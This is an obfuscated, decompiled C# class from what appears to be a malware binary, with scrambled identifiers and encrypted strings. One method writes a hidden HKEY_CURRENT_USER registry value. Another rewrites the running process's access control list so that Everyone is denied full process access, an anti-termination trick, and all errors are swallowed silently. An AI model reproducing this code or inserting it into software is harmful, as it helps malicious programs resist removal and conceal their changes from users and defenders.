using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class OxzYFgRfXvAi
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr jBtWEuORCkBnzaVZ, int sDIKGFoVVEM, [Out] byte[] VLlMXrJrHTWC, uint fqjRjVAGimM, out uint LDcaymvFyhq);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr zPtHRWxEBKMl, int clOREmQcBWhiHvb, [In] byte[] fdvSoJIqQC);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void rhmOIzRJpvKvUO(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GhAMvbuoccW.PbsdnvfpwWRvGCs(GhAMvbuoccW.TfBMtOaYnyXfeqqRN(getString_0(107402336))));
			registryKey.SetValue(GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107402263)), getString_0(107404426));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor xqWTjqgGDEvV(IntPtr intptr_0)
	{
		byte[] vLlMXrJrHTWC = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, vLlMXrJrHTWC, 0u, out var LDcaymvFyhq);
		if ((long)LDcaymvFyhq > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, vLlMXrJrHTWC = new byte[LDcaymvFyhq], LDcaymvFyhq, out LDcaymvFyhq))
		{
			return null;
		}
		return new RawSecurityDescriptor(vLlMXrJrHTWC, 0);
	}

	private void KTGnEOKBcVamRNV(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void ijStrwHioHMPyDK()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = xqWTjqgGDEvV(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			KTGnEOKBcVamRNV(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static OxzYFgRfXvAi()
	{
		Strings.CreateGetStringDelegate(typeof(OxzYFgRfXvAi));
	}
}
